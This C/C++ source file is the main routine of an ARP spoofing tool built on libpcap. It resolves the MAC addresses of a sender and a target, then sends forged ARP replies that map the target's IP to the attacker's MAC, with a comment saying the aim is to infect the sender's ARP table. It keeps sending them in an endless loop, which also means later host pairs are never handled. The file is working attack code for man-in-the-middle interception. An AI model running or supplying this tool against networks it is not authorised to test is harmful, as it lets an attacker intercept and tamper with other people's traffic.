#include "main.h"

int main(int argc, char *argv[])
{
	FlowInfo flow;

	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc - 1; iter += 2)
	{
		printf("\n----------------------------------------\n");
		printf("[*] arp-spoof #%d..", iter / 2);
		printf("\n----------------------------------------\n");

		char *dev = argv[1];
		const char *interfaceName = argv[1];

		// Ip attackerIp;
		// Mac attackerMac;

		getHostInfo(interfaceName, &flow.attackerIp, &flow.attackerMac);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		printf("\n----------------------------------------\n");
		printf("[*] get sender Info..");
		printf("\n----------------------------------------\n");

		flow.senderIp = Ip(argv[iter]);
		flow.senderMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.senderIp);
		printf("[+] senderIp    : %s\n", std::string(flow.senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(flow.senderMac).c_str());

		printf("\n----------------------------------------\n");
		printf("[*] get target Info..");
		printf("\n----------------------------------------\n");

		flow.targetIp = Ip(argv[iter + 1]);
		flow.targetMac = getMac(handle, flow.attackerIp, flow.attackerMac, flow.targetIp);
		printf("[+] targetIp    : %s\n", std::string(flow.targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(flow.targetMac).c_str());

		// Send ARP Reply packet to infect sender's ARP table
		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, flow.senderMac, flow.attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, flow.attackerMac, flow.targetIp, flow.senderMac, flow.senderIp);
		sendArp(handle, pkt);

		while (true)
		{
			spoofProcess(ArpHdr::Reply, handle, pkt, flow);
		}

		pcap_close(handle);
	}
}
